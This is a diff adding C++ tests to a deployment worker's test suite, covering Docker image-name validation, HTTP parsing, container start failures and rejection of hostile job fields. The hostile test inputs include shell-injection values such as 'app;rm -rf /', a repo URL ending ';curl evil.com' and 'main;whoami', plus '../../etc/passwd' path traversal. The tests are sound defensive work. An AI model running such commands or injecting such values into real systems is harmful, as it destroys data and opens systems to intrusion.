@@ -63,6 +63,37 @@ void testDockerClientSimulator() {
     DockerClient docker("/var/run/docker.sock", "simulator");
     TEST_ASSERT(docker.ping(), "Docker ping returns true in simulator");
 
+    // Test image name validation
+    TEST_ASSERT(DockerClient::isValidImageName("df-test-img:latest"), "Valid image name accepted");
+    TEST_ASSERT(DockerClient::isValidImageName("my-app:1.0"), "Image with numbers and dots accepted");
+    TEST_ASSERT(!DockerClient::isValidImageName("bad;name"), "Image name with semicolon rejected");
+    TEST_ASSERT(!DockerClient::isValidImageName("Uppercase:1.0"), "Image name with uppercase rejected");
+    TEST_ASSERT(!DockerClient::isValidImageName(""), "Empty image name rejected");
+
+    bool buildThrew = false;
+    try {
+        docker.buildImage("/tmp", "bad;name:latest");
+    } catch (const std::invalid_argument&) {
+        buildThrew = true;
+    }
+    TEST_ASSERT(buildThrew, "buildImage throws invalid_argument on invalid image name");
+
+    // Test HTTP response parsing
+    auto [code200, b200] = DockerClient::parseHttpResponse("HTTP/1.1 200 OK\r\nContent-Length: 15\r\n\r\n{\"status\":\"ok\"}");
+    TEST_ASSERT(code200 == 200 && b200 == "{\"status\":\"ok\"}", "parseHttpResponse parses 200 OK");
+
+    auto [code204, b204] = DockerClient::parseHttpResponse("HTTP/1.1 204 No Content\r\n\r\n");
+    TEST_ASSERT(code204 == 204 && b204.empty(), "parseHttpResponse parses 204 No Content");
+
+    auto [codeChunked, bChunked] = DockerClient::parseHttpResponse("HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n4\r\nWiki\r\n5\r\npedia\r\n0\r\n\r\n");
+    TEST_ASSERT(codeChunked == 200 && bChunked == "Wikipedia", "parseHttpResponse decodes chunked transfer encoding");
+
+    auto [code400, b400] = DockerClient::parseHttpResponse("HTTP/1.1 400 Bad Request\r\nContent-Length: 26\r\n\r\n{\"message\":\"bad parameter\"}");
+    TEST_ASSERT(code400 == 400 && b400.find("bad parameter") != std::string::npos, "parseHttpResponse parses 400 Bad Request");
+
+    auto [code500, b500] = DockerClient::parseHttpResponse("HTTP/1.1 500 Internal Server Error\r\nContent-Length: 28\r\n\r\n{\"message\":\"container crash\"}");
+    TEST_ASSERT(code500 == 500 && b500.find("container crash") != std::string::npos, "parseHttpResponse parses 500 Internal Server Error");
+
     std::string img = docker.buildImage("/tmp", "df-test-img:latest");
     TEST_ASSERT(!img.empty(), "Image built in simulator");
 
@@ -78,6 +109,8 @@ void testDockerClientSimulator() {
     TEST_ASSERT(cid.rfind("sim_c_", 0) == 0, "Container ID formatted properly in simulator");
 
     TEST_ASSERT(docker.startContainer(cid), "Container started");
+    TEST_ASSERT(!docker.startContainer("fail_sim_container"), "startContainer returns false on failure");
+
     auto info = docker.inspectContainer(cid);
     TEST_ASSERT(info.running, "Container inspect reports running");
     TEST_ASSERT(info.ip_address == "172.20.0.42", "Container IP assigned");
@@ -181,6 +214,79 @@ void testWorkerLifecycle() {
     TEST_ASSERT(success, "Worker processed job through CLONING -> BUILDING -> STARTING -> RUNNING");
 }
 
+void testJobValidationAndStartFailure() {
+    std::cout << "\n[Suite 6] S-07 Job Validation & Container Start Resilience" << std::endl;
+    std::string errReason;
+
+    DeploymentJob validJob;
+    validJob.message_id = "msg-valid-001";
+    validJob.deployment_id = "11111111-1111-1111-1111-111111111111";
+    validJob.project_id = "22222222-2222-2222-2222-222222222222";
+    validJob.user_id = "33333333-3333-3333-3333-333333333333";
+    validJob.project_name = "valid-slug";
+    validJob.port = 3000;
+    validJob.repo_url = "https://github.com/deployforge/sample-node";
+    validJob.branch = "main";
+    TEST_ASSERT(WorkerDaemon::validateJob(validJob, errReason), "Valid job passes validation");
+
+    // Hostile project name (S-07 injection attempt)
+    DeploymentJob hostileProject = validJob;
+    hostileProject.project_name = "app;rm -rf /";
+    TEST_ASSERT(!WorkerDaemon::validateJob(hostileProject, errReason), "Hostile project_name with shell injection rejected");
+    TEST_ASSERT(errReason.find("project_name") != std::string::npos, "Error specifies project_name");
+
+    // Hostile repository URL
+    DeploymentJob hostileRepo = validJob;
+    hostileRepo.repo_url = "https://github.com/foo/bar;curl evil.com";
+    TEST_ASSERT(!WorkerDaemon::validateJob(hostileRepo, errReason), "Hostile repository_url with shell injection rejected");
+    TEST_ASSERT(errReason.find("repository_url") != std::string::npos, "Error specifies repository_url");
+
+    // Hostile branch
+    DeploymentJob hostileBranch = validJob;
+    hostileBranch.branch = "main;whoami";
+    TEST_ASSERT(!WorkerDaemon::validateJob(hostileBranch, errReason), "Hostile branch with shell injection rejected");
+
+    // Path traversal in deployment ID
+    DeploymentJob badDepId = validJob;
+    badDepId.deployment_id = "../../etc/passwd";
+    TEST_ASSERT(!WorkerDaemon::validateJob(badDepId, errReason), "Path traversal deployment_id rejected by UUID check");
+
+    // Invalid port
+    DeploymentJob badPort = validJob;
+    badPort.port = 70000;
+    TEST_ASSERT(!WorkerDaemon::validateJob(badPort, errReason), "Out-of-range port rejected");
+
+    // Non-HTTP URL
+    DeploymentJob badScheme = validJob;
+    badScheme.repo_url = "file:///etc/passwd";
+    TEST_ASSERT(!WorkerDaemon::validateJob(badScheme, errReason), "Non-HTTP repository_url rejected");
+
+    // Test processSingleJob rejects hostile job immediately without spawning
+    Config cfg;
+    cfg.docker_mode = "simulator";
+    cfg.workspace_base_path = "/tmp/df_test_workspaces";
+    cfg.redis_stream = "stream:test_cpp_deployments";
+    cfg.redis_events_stream = "stream:test_cpp_events";
+    cfg.redis_group = "cpp_workers";
+
+    WorkerDaemon worker(cfg);
+    if (!worker.init()) {
+        std::cout << "  ⚠️ Worker init failed (Redis might be offline), skipping job test" << std::endl;
+        return;
+    }
+
+    bool hostileResult = worker.processSingleJob(hostileProject);
+    TEST_ASSERT(!hostileResult, "processSingleJob returns false on hostile job validation failure");
+
+    // Test startContainer failure triggers DEPLOYMENT_FAILED
+    DeploymentJob startFailJob = validJob;
+    startFailJob.message_id = "msg-fail-002";
+    startFailJob.deployment_id = "44444444-4444-4444-4444-444444444444";
+    startFailJob.project_name = "fail-app"; // triggers containerName with "fail" in simulator
+    bool failResult = worker.processSingleJob(startFailJob);
+    TEST_ASSERT(!failResult, "processSingleJob fails cleanly when container start fails");
+}
+
 int main() {
     std::cout << "==================================================" << std::endl;
     std::cout << "  DeployForge C++ Worker Engine Test Suite       " << std::endl;
@@ -191,6 +297,7 @@ int main() {
     testDockerClientSimulator();
     testRedisClient();
     testWorkerLifecycle();
+    testJobValidationAndStartFailure();
 
     std::cout << "\n==================================================" << std::endl;
     std::cout << "  All C++ Worker tests passed! (" << g_passed << "/" << g_total << ")" << std::endl;
